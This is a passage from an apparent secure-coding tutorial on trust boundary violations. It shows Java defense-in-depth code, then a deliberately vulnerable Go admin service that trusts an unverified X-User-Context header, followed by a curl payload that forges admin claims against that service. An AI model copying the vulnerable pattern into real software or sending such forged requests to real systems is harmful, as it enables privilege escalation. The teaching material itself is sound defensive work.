                "boundaries", ctx.crossedBoundaries,
                "validations", ctx.fieldValidations
            ));
        }

        private String calculateOrderHash(OrderData order) {
            return DigestUtils.sha256Hex(
                order.getUserId() + order.getProductId() + order.getQuantity() + order.getPrice());
        }
    }
}
```

**Defense in Depth Layers**:

1. **Zone-Based Validation**: Each trust zone has its own validator with zone-specific rules
```java
public class TrustBoundaryValidator {
    private final TrustZone zone;

    public TrustBoundaryValidator(TrustZone zone) {
        this.zone = zone;
    }

    public boolean containsAttackPattern(String input) {
        // Zone-specific attack pattern detection
        List<Pattern> patterns = AttackPatternRegistry.getPatternsForZone(zone);
        return patterns.stream().anyMatch(p -> p.matcher(input).find());
    }
}
```

2. **Cryptographic Boundary Tokens**: Each zone crossing generates a signed token
```java
// Token proves data was validated at specific boundary
String token = Jwts.builder()
    .claim("zone", currentZone.name())
    .claim("data_hash", computeDataHash(validatedData))
    .setExpiration(new Date(System.currentTimeMillis() + 30000))
    .signWith(SignatureAlgorithm.HS256, zoneKey)
    .compact();
```

3. **Trust Chain Verification**: Data tier verifies complete chain before database access
```java
private boolean verifyCompleteTrustChain(TrustBoundaryContext ctx) {
    // Must have crossed all boundaries in correct order
    return ctx.crossedBoundaries.containsAll(
        Arrays.asList("EXTERNAL->DMZ", "DMZ->APPLICATION", "APPLICATION->DATA"));
}
```

**Additional Protections**:

- **Never trust source zone alone**: Network segmentation can be bypassed; always verify cryptographic tokens
- **Re-validate at every boundary**: Each zone applies its own validation rules even for "validated" data
- **Audit complete trust chain**: Store provenance data to detect boundary bypass attempts in forensic analysis
- **Time-limited tokens**: Boundary tokens expire quickly (10-30 seconds) to prevent replay attacks
- **Server-side authoritative data**: Business-critical values (prices, permissions) come from server, never trusted from request
- **Fail closed**: Any boundary verification failure blocks the request entirely

This is a critical security concern! Trust boundary violations occur when one component blindly trusts data from another without verification. The 2024 Ivanti vulnerability (CVE-2024-21887) demonstrated how attackers can exploit internal services that assume requests are pre-validated.

**VULNERABLE CODE**:

```go
package main

import (
	"encoding/json"
	"net/http"
)

type UserContext struct {
	UserID   string   `json:"user_id"`
	Email    string   `json:"email"`
	Roles    []string `json:"roles"`
	IsAdmin  bool     `json:"is_admin"`
}

// Internal admin service - VULNERABLE: Trusts headers from gateway
func adminHandler(w http.ResponseWriter, r *http.Request) {
	// DANGEROUS: Blindly trusting X-User-Context header from API gateway
	userContextJSON := r.Header.Get("X-User-Context")

	var userCtx UserContext
	if err := json.Unmarshal([]byte(userContextJSON), &userCtx); err != nil {
		http.Error(w, "Invalid context", http.StatusBadRequest)
		return
	}

	// VULNERABLE: No verification that context came from trusted source
	// Attacker can directly call internal service with forged headers
	if userCtx.IsAdmin {
		// Grant admin access based on unverified claim
		performAdminAction(w, userCtx)
	} else {
		http.Error(w, "Admin access required", http.StatusForbidden)
	}
}

func performAdminAction(w http.ResponseWriter, ctx UserContext) {
	w.Write([]byte("Admin action performed for: " + ctx.UserID))
}

func main() {
	http.HandleFunc("/internal/admin", adminHandler)
	http.ListenAndServe(":8081", nil) // Internal service port
}
```

**Attack Payload**:
```bash
# Attacker bypasses API gateway and directly calls internal service
curl -X POST http://internal-service:8081/internal/admin \
  -H 'X-User-Context: {"user_id":"attacker","email":"evil@attacker.com","roles":["admin","superuser"],"is_admin":true}'
```

**Why This Is Dangerous**:
- Internal service trusts header values without cryptographic verification
- Attacker can directly reach internal services if network segmentation is weak
- No validation that the request actually passed through the trusted gateway
- User context can be completely fabricated by attackers

